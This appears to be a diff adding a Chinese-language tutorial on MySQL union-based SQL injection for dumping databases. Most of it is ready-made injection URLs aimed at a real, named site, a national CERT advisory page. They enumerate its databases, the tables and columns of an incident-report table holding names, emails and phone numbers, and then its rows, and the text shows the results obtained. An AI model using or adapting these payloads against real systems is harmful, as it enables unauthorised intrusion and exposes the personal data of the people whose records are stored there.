@@ -1,0 +1,54 @@
+高级暴库技巧总结
+
+
+
+1.判断版本 and ord(mid(version(),1,1))>51 返回正常，说明大于4.0版本，支持ounion查询
+
+2.猜解字段数目,
+
+用order by也可以猜，
+也可以用union select一个一个的猜解
+
+ and 2=4 union select 1,2,3,4,5,6,7,8,9--
+
+3.查看数据库版本及当前用户，
+and 2=4 union select 1,user(),version(),4,5,6,7,8,9--
+
+数据库版本5.1.35，据说mysql4.1以上版本支持concat函数，
+
+4.判断有没有写权限
+and (select count(*) from MySQL.user)>0-- 
+返回错误，没有写权限
+
+手动猜表
+
+5.查库，以前用union select 1,2,3,SCHEMA_NAME,5,6,n from information_schema.SCHEMATA limit 0,1
+
+土耳其黑客的手法
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_schema),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+information_schema.columns--
+成功查出所有数据库，国外的黑客就是不一般。数据库如下：
+information_schema,Advisory,IR,mad,member,mysql,twcert,vuldb,vulscandb
+
+6.爆表，爆的是twcert库
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_name),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+information_schema.columns+where+table_schema=0x747763657274--
+爆出如下表
+downloadfile,irsys,newsdata,secrpt,secrpt_big5
+
+
+7.爆列名，这次爆的是irsys表
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+column_name),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+information_schema.columns+where+table_name=0x6972737973--
+爆出如下列
+ir_id,name,company,email,tel,pubdate,rptdep,eventtype,eventdesc,machineinfo,procflow,memo,filename,systype,status
+
+8.查询字段数，到这一步，国内很少有黑客去查询字段数的，直接用limit N,1去查询，直接N到报错为止。
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,CONCAT(count(*)),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+twcert.irsys--
+
+返回是3，说明每个列里有3个地段
+
+9.爆字段内容
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,name,0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+twcert.irsys+LIMIT+0,1--
+爆出name列的第一个字段的内容
+
+http://www.cert.org.tw/document/advisory/detail.php?id=7+and+1=0+union+select+concat(0x5B78786F6F5D,name,0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+twcert.irsys+LIMIT+1,1--
+爆出name列的第二个字段的内容
+
